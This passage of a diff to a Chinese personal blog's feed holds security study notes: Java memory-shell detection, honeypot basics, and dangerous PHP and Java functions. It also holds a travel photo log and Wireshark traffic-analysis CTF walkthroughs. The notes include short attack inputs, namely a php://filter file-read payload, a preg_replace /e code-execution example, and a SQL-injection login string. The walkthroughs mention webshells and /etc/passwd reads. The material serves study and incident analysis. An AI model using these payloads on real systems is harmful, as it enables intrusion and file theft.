+<h2 id="十七、怎么排查java内存马"><a href="#十七、怎么排查java内存马" class="headerlink" title="十七、怎么排查java内存马"></a>十七、怎么排查java内存马</h2><p>直接利用内存马检测工具去找，github也有很多检测脚本，手工的话可以分析web日志，filter或者listener类型的内存马，会有大量路径相同参数不同的url请求，或者页面不存在但是返回200的请求，分析web.xml文件，内存马的Filter是动态注册的，web.xml是没有配置的，也有可能是中间件漏洞通过代码执行加载内存马，这就可以去排查中间件的错误日志，像哥斯拉和冰蝎的内存马也会有跟webshell相似的特征，分析特殊的classloader加载，攻击者喜欢利用TemplatesImpl和<code>bcel</code>加载内存马，因为内存马是驻留在内存里的，本地无class文件，通过检测Filter对应的ClassLoader目录下是否存在class文件来判断，也可以把内存中所有的Filter的class dump出来，使用工具分析是否存在恶意代码</p>
+<h2 id="十八、蜜罐原理"><a href="#十八、蜜罐原理" class="headerlink" title="十八、蜜罐原理"></a>十八、蜜罐原理</h2><p><strong>创建虚拟环境：</strong>在网络中创建一个看似易受攻击的虚拟环境，该环境模拟真实系统的一部分或全 部功能，包括应用程序、服务和操作系统。</p>
+<p><strong>引诱攻击者：</strong>通过暴露蜜罐的存在，例如通过公开可访问的IP地址或虚假的网站，吸引攻击者主 动尝试入侵、扫描或攻击蜜罐系统。</p>
+<p><strong>监测和记录：</strong>一旦攻击者进入蜜罐系统，蜜罐会记录攻击者的行为、攻击技术和使用的工具。  这些信息对于理解攻击者的策略和行为非常有价值。</p>
+<p> <strong>分析和响应：</strong>通过分析记录的数据，研究人员可以识别攻击者的行为模式、漏洞利用方法和漏洞 的目标。</p>
+<p>这些信息可以用于改进真实系统的安全性，及时发现和应对新的威胁。  蜜罐的优势在于能够提供高质量的<code>攻击数据和情报</code>，帮助安全团队更好地了解攻击者的<code>行为模式和目的</code>，加强防御措施并及时应对威胁。</p>
+<p>然而，蜜罐也需要专业人员来设计、部署和管理，以确保其安全性和有效性，并避免对真实系统 造成潜在的风险。</p>
+<h2 id="十九、内存马查杀-原理"><a href="#十九、内存马查杀-原理" class="headerlink" title="十九、内存马查杀&amp;原理"></a>十九、内存马查杀&amp;原理</h2><p><strong>java内存马原理</strong></p>
+<p>通过在Java虚拟机（JVM）中运行的恶意代码，实现对被攻击者系统的远程控制。其原理是通过在Java虚拟机中注入特定的Java类、变量或方法等Java对象，然后在Java虚拟机中运行这些代码，实现对受害者机器的远程控制</p>
+<p><strong>java内存马排查</strong></p>
+<p>利用Java Agent技术遍历所有已经加载到内存中的class。  先判断是否是内存马，是则进入内存查杀。</p>
+<p><strong>识别</strong></p>
+<p>1，filter名字很特别</p>
+<p>2，filter优先级是第一位</p>
+<p>3，对比web.xml中没有filter配置</p>
+<p>4，特殊classloader加载</p>
+<p>5，对应的classloader路径下没有class文件</p>
+<p>6，Filter的doFilter方法中 有恶意代码</p>
+<p><strong>清除</strong></p>
+<p>1、清除内存马中的Filter的恶意代码，2、 模拟中间件注销Filter</p>
+<h2 id="二十、常见的危险PHP函数总结"><a href="#二十、常见的危险PHP函数总结" class="headerlink" title="二十、常见的危险PHP函数总结"></a>二十、常见的危险PHP函数总结</h2><p><strong>eval() — 把字符串作为PHP代码执行</strong></p>
+<p>语法eval( string $code ) : mixed</p>
+<p>把字符串 code 作为PHP代码执行。</p>
+<p>这个函数一般都是攻击者用的，没什么人会拿这个放到自己的源码里面</p>
+<p>PHP官方也给出了警告</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240627111045791-270916336.png" alt="image-20240627111043558"></p>
+<p><strong>assert() — 检查一个断言是否为 false （把字符串作为PHP代码执行）</strong></p>
+<p>语法</p>
+<p>PHP 5</p>
+<p>assert( mixed $assertion , string $description &#x3D; ? ) : bool</p>
+<p>PHP 7</p>
+<p>assert( mixed $assertion , Throwable $exception &#x3D; ? ) : bool</p>
+<p>assert()会检查指定的 assertion 并在结果为 false 时采取适当的行动（把字符串  $assertion 作为PHP代码执行）</p>
+<p><strong>preg_replace — 执行一个正则表达式的搜索和替换</strong></p>
+<p>语法</p>
+<p>preg_replace( mixed $pattern , mixed $replacement , mixed $subject , int  $limit &#x3D; -1 , int &amp;$count &#x3D; ? ) : mixed</p>
+<p>搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换。</p>
+<p>&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>如果我们提交 ?h&#x3D;phpinfo()，&#x2F;e就会将h参数当做PHP代码，phpinfo()将会被执行。</p>
+<h4 id="引发命令执行的危险函数"><a href="#引发命令执行的危险函数" class="headerlink" title="引发命令执行的危险函数"></a>引发命令执行的危险函数</h4><p> <strong>system — 执行外部程序，并且显示输出</strong></p>
+<p>说明</p>
+<p><code>system</code>( string <code>$command</code> , int <code>&amp;$return_var</code> &#x3D; ? ) : string</p>
+<p>同 C 版本的 <code>system()</code>函数一样， 本函数执行 <code>command</code> 参数所指定的命令， 并且输出执行结果。</p>
+<p>如果 PHP 运行在服务器模块中， system()函数还会尝试在每行输出完毕之后， 自动刷新 web服务器的输出缓存。</p>
+<p>如果要获取一个命令未经任何处理的 原始输出，请使用 passthru()函数。</p>
+<p>举个例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240627111508548-939463198.png" alt="image-20240627111507963"></p>
+<p> <strong>exec — 执行一个外部程序</strong></p>
+<p>exec()执行 command 参数所指定的命令</p>
+<p>举个例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240627111549318-1473617007.png" alt="image-20240627111548732"></p>
+<p><strong>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字 符串的方式返回。</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>passthru — 执行外部程序并且显示原始输出</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="引发文件包含的危险函数"><a href="#引发文件包含的危险函数" class="headerlink" title="引发文件包含的危险函数"></a>引发文件包含的危险函数</h4><p>主要作用为包含并运行指定文件。</p>
+<ol>
+<li>include()：代码执行到此函数时才将文件包含进来，发⽣错误时只警告并继续执行</li>
+<li>include_once()：功能和前者一样，区别在于调用同一文件时，程序只调用一次</li>
+<li>require()：立即调用此函数包含文件，发⽣错误时，会输出错误信息 并⽴即终⽌程序</li>
+<li>require_once()：功能和前者一样，区别在于调用同一文件时，程序只调用一次</li>
+</ol>
+<p>include $file;</p>
+<p>在变量 $file 可控的情况下，我们就可以包含任意文件，从而达到 getshell 的目的。</p>
+<p>另外，在不同的配置环境下，可以包含不同的文件。</p>
+<p>因此又分为远程文件包含和本地文件包含。</p>
+<p>包含函数也能够读取任意文件内容，这就需要用到【支持的协议和封装协议】和【过滤器】。</p>
+<p>例如，利用php流filter读取任意文件</p>
+<p>include($_GET[‘file’]); </p>
+<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
+<p>解释：?file&#x3D;php:&#x2F;&#x2F; 协议 &#x2F; 过滤器 &#x2F; 文件</p>
+<h4 id="引发文件操作的危险函数"><a href="#引发文件操作的危险函数" class="headerlink" title="引发文件操作的危险函数"></a>引发文件操作的危险函数</h4><p>copy</p>
+<p>file_get_contents()</p>
+<p> highlight_file()</p>
+<p> fopen()</p>
+<p> read file()</p>
+<p> fread()</p>
+<p> fgetss()</p>
+<p> fgets()</p>
+<p> parse_ini_file()</p>
+<p> show_source()</p>
+<p> file()</p>
+<p>任意文件读取、写入、删除往往是上面几个函数受到了控制（当然还有其他的函数）。  不同的函数在不同的场景有不同的作用和不同的利用手法。  </p>
+<p>读取：可以读取配置等文件，拿到key  </p>
+<p>写入：可以写入shell代码相关的内容  </p>
+<p>删除：可以删除.lock文件而可以重新安装覆盖  </p>
+<p>更多思路请自行挖掘测试！！</p>
+<h4 id="引发信息泄露的危险函数"><a href="#引发信息泄露的危险函数" class="headerlink" title="引发信息泄露的危险函数"></a>引发信息泄露的危险函数</h4><p>phpinfo — 输出关于 PHP 配置的信息</p>
+<p>getenv — 获取一个环境变量的值</p>
+<p>get_current_user — 获取当前 PHP 脚本所有者名称</p>
+<p>getlastmod — 获取页面最后修改的时间</p>
+<p>ini_get — 获取一个配置选项的值</p>
+<p>glob — 寻找与模式匹配的文件路径</p>
+<h4 id="引发XEE的危险函数"><a href="#引发XEE的危险函数" class="headerlink" title="引发XEE的危险函数"></a>引发XEE的危险函数</h4><p>__construct()</p>
+<p>addAttribute()</p>
+<p>addChild()</p>
+<p>asXML()</p>
+<p>attributes()</p>
+<p>children()</p>
+<p>getDocNamespaces()</p>
+<p>getName()</p>
+<p>getNamespaces()</p>
+<p>registerXPathNamespace()</p>
+<p>simplexml_import_dom()</p>
+<p>simplexml_load_file()</p>
+<p>simplexml_load_string()</p>
+<p>xpath()</p>
+<h4 id="引发反序列化的危险函数"><a href="#引发反序列化的危险函数" class="headerlink" title="引发反序列化的危险函数"></a>引发反序列化的危险函数</h4><p>序列化函数：serialize()</p>
+<p>反序列化函数：unserialize()</p>
+<p>魔术函数：</p>
+<p>__construc()</p>
+<p>__destruct()</p>
+<p>__call()</p>
+<p>__callStatic()  </p>
+<p>__get()  </p>
+<p>__set() </p>
+<p>__isset()  </p>
+<p>__unset() </p>
+<p>__sleep() </p>
+<p>__wakeup()  </p>
+<p>__toString()  </p>
+<p>__invoke()  </p>
+<p>__set_state()  </p>
+<p>__clone()  </p>
+<p>__debuginfo()</p>
+<h2 id="二十一、Java危险函数"><a href="#二十一、Java危险函数" class="headerlink" title="二十一、Java危险函数"></a>二十一、Java危险函数</h2><h4 id="Java命令执行的函数"><a href="#Java命令执行的函数" class="headerlink" title="Java命令执行的函数"></a>Java命令执行的函数</h4><p><strong>Runtime类</strong></p>
+<p>Runtime类是私有的， 类的对象无法通过这种方式注册： Runtime r &#x3D; new Runtime() ; </p>
+<p>只能通过静态方法（getRuntime）获取： Runtime r &#x3D; Runtime.getRuntime()；</p>
+<p><strong>ProcessBuilder类</strong></p>
+<p>这种复现本质意义不大，重点是记一下敏感函数，</p>
+<p>rce2Servlet.java</p>
+<p><strong>ProcessImpl类ProcessImpl类通常是为ProcessBuilder.start()创建新进 程服务的，不能直接去调用。</strong></p>
+<p>看到ProcessImpl类构造器私有，所以不能直接对其进行实例化，为了演示可以用反射进行调 用。</p>
+<p>在获取到一个静态方法后，必须用setAccessible修改它的作用域，否则不能调用。</p>
+<h2 id="二十二、如何快速判定xss类型"><a href="#二十二、如何快速判定xss类型" class="headerlink" title="二十二、如何快速判定xss类型"></a>二十二、如何快速判定xss类型</h2><p><strong>存储型xss：</strong></p>
+<p>发送⼀次带XSS代码的请求，以后这个⻚⾯的返回包⾥都会有XSS代码</p>
+<p><strong>反射型xss：</strong></p>
+<p>发送⼀次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码</p>
+<p><strong>dom型xss：</strong></p>
+<p>发送⼀次带XSS代码的请求，在返回包⾥压根⼉就找不到XSS代码的影⼦</p>
+<h2 id="二十三、csrf、ssrf和重放攻击有什么区别"><a href="#二十三、csrf、ssrf和重放攻击有什么区别" class="headerlink" title="二十三、csrf、ssrf和重放攻击有什么区别"></a>二十三、csrf、ssrf和重放攻击有什么区别</h2><p>CSRF是跨站请求伪造攻击，由客户端发起</p>
+<p>SSRF是服务器端请求伪造，由服务器发起</p>
+<p>重放攻击是将截获的数据包进⾏重放，达到身份认证等⽬的</p>
+<h2 id="常见对应端口及服务"><a href="#常见对应端口及服务" class="headerlink" title="常见对应端口及服务"></a>常见对应端口及服务</h2><p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610192113939-367834412.png" alt="image-20240610192109884"></p>
+<h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><p>安全设备<br>奇安信天眼<br>设备类型:全流量<br>大致使用方法<br>天眼首页截图:</p>
+<p>左边监测控制台,打开,有告警信息:</p>
+<p>分析时觉得IP有问题可以在攻击IP中搜索</p>
+<p>打开告警列表(奇安信网神?):</p>
+<p>点击详情,显示如下内容:</p>
+<p>微步tdp&#x2F;tip<br>TDP的<br>主页面:</p>
+<p>主要点击外部攻击的外部攻击项</p>
+<p>告警主机项，上面可以查询IP：</p>
+<p>内网渗透分析,被攻陷后可以看网络拓扑:</p>
+<p>优势项：自动识别一些恶意IP，即答：<u>tdp威胁情报发现有利于溯源分析</u><br><br><br></p>
+<p>青藤云HIDS<br>设备类型:全流量<br>大致使用方法<br>主页面，主机资产，安全台账功能，将可疑IP放到里面点击主机详情，看是不是内部IP：</p>
+<p>点击入侵事件,查看告警,点击告警的漏洞名称,可以跳到类似于天眼的详情信息页面</p>
+<p>可以查日志，筛选IP&#x2F;域名&#x2F;进程进行查询</p>
+<p>优势项:可以直接发现暴力破解,不需要人工添加规则</p>
+<p>明御安全网关<br>总结优势<br>HIDS：对全网信息捕捉</p>
+<p>微步:</p>
+<p>攻击发现，会显示攻击者画像 方便溯源分析<br>威胁情报发现，发现恶意IP<br>亚信：ei拦截的恶意文件会自动在an中运行检测生成报告</p>
+<p>ddei邮件网关，过滤垃圾邮件，对恶意文件隔离<br>ddan沙箱（&#x3D;微步云沙箱）：检测恶意文件，分析恶意样本，收集攻击信息，生成行为报告</p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>旅游vlog</title>
+    <url>/posts/e42dbe7e.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<p>爱民谣</p>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=31445772&auto=0&height=66"></iframe>
+
+<p>铁路会员积分到9400了</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240807194241534-149490777.png" alt="image-20240807194232418"></p>
+<h2 id="23年二月-商丘"><a href="#23年二月-商丘" class="headerlink" title="23年二月 商丘"></a>23年二月 商丘</h2><p>骑马</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609235855070-349630753.png" alt="image-20240609235854475"></p>
+<p>赛车</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240609235922572-1439168124.png" alt="image-20240609235916947"></p>
+<p>看古城</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000033705-1839786062.png" alt="image-20240610000031135"></p>
+<h2 id="23年四月-开封"><a href="#23年四月-开封" class="headerlink" title="23年四月 开封"></a>23年四月 开封</h2><p>开封鼓楼</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000259773-1915523068.png" alt="image-20240610000258835"></p>
+<p>期待已久的打铁花，现场很美，画质可能被图床压缩了，没有现场好看</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000625079-1301771947.png" alt="image-20240610000624124"></p>
+<p>(｡･∀･)ﾉﾞ嗨</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610000959834-909010269.png" alt="image-20240610000958816"></p>
+<h2 id="23年四月-洛阳"><a href="#23年四月-洛阳" class="headerlink" title="23年四月 洛阳"></a>23年四月 洛阳</h2><p>千窟为佑 太平无忧</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610001415503-106223712.png" alt="image-20240610001414507"></p>
+<p>无忧无虑</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610001628619-1480015057.png" alt="image-20240610001625964"></p>
+<h2 id="23年五月-郑州登封"><a href="#23年五月-郑州登封" class="headerlink" title="23年五月 郑州登封"></a>23年五月 郑州登封</h2><p>青春没有售价，嵩山就在脚下</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610002528685-142711459.png" alt="image-20240610002527596"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610002556216-262726712.png" alt="image-20240610002555576"></p>
+<h2 id="23年十二月-武汉"><a href="#23年十二月-武汉" class="headerlink" title="23年十二月 武汉"></a>23年十二月 武汉</h2><p>古人西辞黄鹤楼，烟花十二月去武汉</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610002924613-1983262460.png" alt="image-20240610002923127"></p>
+<p>步行街江汉关</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003027894-1658771681.png" alt="image-20240610003027550"></p>
+<p>长江大桥，很清爽</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003052750-631552577.png" alt="image-20240610003051755"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003517855-927015852.png" alt="image-20240610003513205"></p>
+<h2 id="24年二月-徐州"><a href="#24年二月-徐州" class="headerlink" title="24年二月 徐州"></a>24年二月 徐州</h2><p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003809562-1194830605.png" alt="image-20240610003803536"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610003909673-548240670.png" alt="image-20240610003904633"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004010708-1279197733.png" alt="image-20240610004010404"></p>
+<h2 id="24年四月-焦作"><a href="#24年四月-焦作" class="headerlink" title="24年四月 焦作"></a>24年四月 焦作</h2><p>拿自由敬青春</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004439818-1718239269.png" alt="image-20240610004430581"></p>
+<p>一叶扁舟</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004511751-1526690432.png" alt="image-20240610004505454"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004543291-1559204537.png" alt="image-20240610004530177"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610004643011-2061532258.png" alt="image-20240610004637830"></p>
+<h2 id="24年四月-西安"><a href="#24年四月-西安" class="headerlink" title="24年四月 西安"></a>24年四月 西安</h2><p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610005004439-1352672664.png" alt="image-20240610004959118"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610005030831-1684737016.png" alt="image-20240610005016115"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240610005120749-766008487.png" alt="image-20240610005115208"></p>
+<h2 id="24年7月-北京"><a href="#24年7月-北京" class="headerlink" title="24年7月 北京"></a>24年7月 北京</h2><p>HVV经历</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240831105653115-857898814.png" alt="image-20240831105619740"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240831105911882-154478791.png" alt="image-20240831105828978"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240831111433655-649346347.png" alt="image-20240831111349412"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240831111517591-1875079912.png" alt="image-20240831111452432"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202408/3373819-20240831111608864-1942078496.png" alt="image-20240831111527493"></p>
+]]></content>
+      <categories>
+        <category>生活</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>数据流量分析</title>
+    <url>/posts/51705.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="数据分析01"><a href="#数据分析01" class="headerlink" title="数据分析01"></a>数据分析01</h2><p>http.request.method &#x3D;&#x3D;POST<br>筛选出采用http协议的post方式的数据包，发现请求都是172.16.1.110，发送到172.16.1.18<br>黑客IP是172.16.1.110<br>或者使⽤过滤规则 tcp.connection.syn 过滤出所有带有SYN标志位的数据包，发现IP为172.16.1.110<br>的易受攻击端⼝短时间内发送了⼤量的建⽴连接请求，因此判定 172.16.1.110 为攻击机 172.16.1.18为<br>服务器<br>FLAG: 172.16.1.110</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153434973-1680874269.png" alt="image-20240619153436773"></p>
+<p>ip.src &#x3D;&#x3D; 172.16.1.110 and ip.dst &#x3D;&#x3D; 172.16.1.18 and tcp.connection.syn<br> TCP连接的SYN标志被设置。SYN标志表示一个TCP连接请求，用于建立一个新的连接<br>FLAG: 21&#x2F;22&#x2F;23&#x2F;80&#x2F;3306</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153457056-1932560292.png" alt="image-20240619153458454"></p>
+<p>统计-&gt;协议分级 发现数据包中有vnc、telnet、ssh、mysql、http、ftp-data、ftp、igmp、arp<br>其中telnet和ssh都是远程终端协议，telnet是明⽂传输⽽ssh是加密传输，ftp是命令控制协议，ftp<br>data是真正文件传输走的协议，因此只要看到存在ftp-data协议，就证明从ftp服务器传输了数据<br>vnc协议是磐云平台上连接虚拟机⾛的协议，这个可以忽略</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153517745-455823692.png" alt="image-20240619153519164"></p>
+<p>综上所述，能查看服务器主机名的协议有：<br>telnet<br> ssh (加密的，可以适当性忽略)<br> http(如果存在命令执⾏漏洞，就有可能查看主机名)<br>其实telnet协议在不登录服务器的情况下，就会显示其主机名。主机名 login 主机名可能会变，但是<br>login始终固定，因此我们可以构造如下过滤规则，筛选出所有内容包含login的telnet数据包<br>telnet contains “login”</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153536364-602711919.png" alt="image-20240619153538045"></p>
+<p>或点击筛选出来的telnet数据包右键追踪流 -&gt; TCP流<br>FLAG: SecTestLabs</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153552223-862063718.png" alt="image-20240619153554014"></p>
+<p>数据包中有vnc、telnet、ssh、mysql、http、ftp-data、ftp、IGMP、arp<br>设计密码认证有telnet、mysql、ftp、ssh (加密的，可以适当性忽略)<br>如上图查看telnet登录都是显示登录错误<br>mysql.command<br>使用过滤规则过滤出mysql执行命令<br>可以看出mysql是登录成功了</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153614598-407397050.png" alt="image-20240619153616271"></p>
+<p>追踪流-&gt;tcp流<br>FLAG: 5.7.26</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153629369-2074965379.png" alt="image-20240619153631079"></p>
+<p>顺便看下是不是暴力破解，数据库登录错误会显示：ERROR 1045 (28000): Access denied for user<br>‘用户名‘@’主机名’ (using password: YES)<br>使用mysql.error_code&#x3D;&#x3D;1045 过滤规则查看到就是暴力破解</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153642021-889017229.png" alt="image-20240619153643725"></p>
+<p>查看最后几个数据直接看到一句话木马<br>FLAG: horse<br>FLAG：lqsym</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153720217-2116545314.png" alt="image-20240619153721896"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知道木马名称horse.php，利用木马肯定会进行post请求，一种方法是过滤http包含horse.php数据包，另</span><br><span class="line">一种是查看所有post请求数据，前者方便些</span><br><span class="line">http contains &quot;horse.php&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153736181-1390259469.png" alt="image-20240619153737828"></p>
+<p>查看tcp流，需要解码，显示查看etc目录，再看下一个数据流 FLAG: passwd</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153858445-328000929.png" alt="image-20240619153900215"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153910382-1025583693.png" alt="image-20240619153912146"></p>
+<p>找到了异常⽤户并且使⽤该⽤户名对某个服务进⾏密码爆破枚举，那么该异常⽤户肯定是 通过读<br>取&#x2F;etc&#x2F;passwd⽂件所看到的，通过查看该⽂件我们发现，只有⽤户suictsr247可以登录到系统，并且是⾮<br>系统⽤户，其还在root组 ⾥⾯</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619153957174-1098027555.png" alt="image-20240619153958861"></p>
+<p>由于诸多协议都是基于tcp的，因此我们使⽤ tcp contains “suictsr247”<br>我们看到大部分都是FTP服务，剩下俩是http，</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154019106-813217475.png" alt="image-20240619154020568"></p>
+<p>FTP登录成功显示的状态码是230，使用过滤规则<br>ftp.response.code&#x3D;&#x3D;230</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154035722-792054202.png" alt="image-20240619154037492"></p>
+<p>看到第一个数据流没有做任何操作，RETR是FTP中的命令RETR flag.jpg 意思是下载名为flag.jpg文件，<br>接下我们要做的事情就是，将该⽂件导出，前⾯说过，ftp在进⾏⽂件传输的时候，⾛的是ftp-data协议，因<br>此我们直接过滤该协议即可，由于⽂件传输⾛的是切⽚传输，会将⼀个⽂件分为多次发送，最终进⾏合并，意<br>思有很多flag.jpg，只需要选择任意⼀个追踪流即可<br>FLAG: harmony</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154140357-490746339.png" alt="image-20240619154141810"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154147095-2085816783.png" alt="image-20240619154148808"></p>
+<h2 id="数据分析02"><a href="#数据分析02" class="headerlink" title="数据分析02"></a>数据分析02</h2><p>通过直接分析端口得出<br>黑客ip：192.168.1.25<br>服务器ip：192.168.1.5</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154234908-1254783750.png" alt="image-20240619154236618"></p>
+<p>做个过滤，查看一下<br>ip.src&#x3D;&#x3D;192.168.1.25<br> flag：1</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154253099-1154840722.png" alt="image-20240619154254788"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用过滤ip.src==192.168.1.25 and tcp.connection.syn没查看的</span><br><span class="line">修改下参数ip.src==192.168.1.25 and tcp.connection.rst</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154312607-953563727.png" alt="image-20240619154314250"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154334154-145866405.png" alt="image-20240619154335799"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag：21,23,80,445,3306,3389</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154356475-927600043.png" alt="image-20240619154358175"></p>
+<p>筛选http，字符串筛选login寻找，应该是post请求，点开就找到了 flag：’or’1’&#x3D;’1</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154408997-1749416248.png" alt="image-20240619154410672"></p>
+<p>登录成功后发现上传了一张图片，而 content-type 值为 image&#x2F;jpeg，那么很明显这里就是文件上传 MIME 绕过</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154457719-25275776.png" alt="image-20240619154459430"></p>
+<p>使用过滤出post请求，找到一句话木马密码<br>http.request.method &#x3D;&#x3D;POST<br> flag：Q</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154525742-70105635.png" alt="image-20240619154527456"></p>
+<p>继续往下查看，显示出变化 flag：c:&#x2F;phpstudy&#x2F;www&#x2F;shell2.php</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154540454-1625652965.png" alt="image-20240619154542154"></p>
+<p>下载文件应该还是post请求，使用过滤http.request.method &#x3D;&#x3D;POST</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154554493-1232244455.png" alt="image-20240619154556238"></p>
+<p>将内容查看tcp流保存原始数据为zip格式打开<br>flag：DPS</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619154610429-1615102666.png" alt="image-20240619154612186"></p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>第八届御网杯线上赛WP</title>
+    <url>/posts/34593.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="信息安全大赛的通知"><a href="#信息安全大赛的通知" class="headerlink" title="信息安全大赛的通知"></a>信息安全大赛的通知</h3><p>经典签到题目</p>
